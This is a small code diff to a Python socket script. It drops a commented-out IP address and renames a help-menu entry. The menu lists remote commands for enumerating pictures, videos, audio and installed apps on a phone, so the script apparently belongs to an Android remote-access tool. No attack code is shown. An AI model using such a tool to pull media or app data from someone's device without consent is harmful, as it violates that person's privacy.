@@ -7,8 +7,6 @@ from socket import *
 
 verbose = True
 
-#addr="192.168.87.143"
-
 def sanitize_json(json):
     json = json.replace("\'", "\"")
     json = json.split('[')[1].split(']')[0]
@@ -94,7 +92,7 @@ def show_available_cmds():
     print('listPics: List all the pictures')
     print('listVideos: List all the videos')
     print('listAudios: List all the audio files')
-    print('po: List all the apps installed')
+    print('listApps: List all the apps installed')
     print('listAppsSystem: List all the system apps')
     print('listAppsPhone: List all the phone apps')
     print('listAppsSdcard: List all the apk files in the sdcard')
